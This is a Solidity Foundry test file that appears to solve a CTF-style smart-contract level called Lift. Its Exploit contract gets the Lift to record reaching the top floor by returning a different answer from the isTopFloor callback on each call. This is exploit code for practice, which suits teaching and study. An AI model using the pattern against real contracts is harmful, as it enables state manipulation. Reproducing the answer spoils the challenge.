// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/07_Lift/Lift.sol";

// forge test --match-contract LiftTest
contract LiftTest is BaseTest {
    Lift instance;
    bool isTop = true;

    function setUp() public override {
        super.setUp();

        instance = new Lift();
    }

    function testExploitLevel() public {
        Exploit exploit = new Exploit();
        exploit.attack(instance);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.top(), "Solution is not solving the level");
    }
}

contract Exploit is House {
    uint8 floor = 0;

    function attack(Lift instance) external {
        instance.goToFloor(1);
    }

    function isTopFloor(uint256) external returns (bool) {
        return floor++ == 1;
    }
}